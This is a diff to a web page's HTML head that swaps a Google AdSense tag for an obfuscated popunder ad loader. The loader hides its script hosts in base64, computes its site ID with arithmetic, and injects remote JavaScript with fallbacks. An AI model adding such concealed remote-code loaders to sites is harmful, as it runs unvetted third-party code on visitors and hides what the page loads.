@@ -19,11 +19,55 @@
 
       gtag("config", "G-LTN34WZS07");
     </script>
-    <script
-      async
-      src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9294924445501852"
-      crossorigin="anonymous"
-    ></script>
+    <script type="text/javascript" data-cfasync="false">
+      /*<![CDATA[/* */
+      (function () {
+        var d = window,
+          e = "a04cb151ca1cf8683c97b498a9451780",
+          h = [
+            ["siteId", 465 * 162 - 452 * 460 + 329 + 5385530],
+            ["minBid", 0],
+            ["popundersPerIP", "0"],
+            ["delayBetween", 0],
+            ["default", false],
+            ["defaultPerDay", 0],
+            ["topmostLayer", "auto"],
+          ],
+          j = [
+            "d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL0xGYXcvZGMvY2ZldGNoLWpzb25wLm1pbi5qcw==",
+            "ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvZHRocmVlLm1pbi5qcw==",
+          ],
+          r = -1,
+          a,
+          f,
+          g = function () {
+            clearTimeout(f);
+            r++;
+            if (j[r] && !(1788907768000 < new Date().getTime() && 1 < r)) {
+              a = d.document.createElement("script");
+              a.type = "text/javascript";
+              a.async = !0;
+              var w = d.document.getElementsByTagName("script")[0];
+              a.src = "https://" + atob(j[r]);
+              a.crossOrigin = "anonymous";
+              a.onerror = g;
+              a.onload = function () {
+                clearTimeout(f);
+                d[e.slice(0, 16) + e.slice(0, 16)] || g();
+              };
+              f = setTimeout(g, 5e3);
+              w.parentNode.insertBefore(a, w);
+            }
+          };
+        if (!d[e]) {
+          try {
+            Object.freeze((d[e] = h));
+          } catch (e) {}
+          g();
+        }
+      })();
+      /*]]>/* */
+    </script>
   </head>
   <body>
     <div id="root"></div>
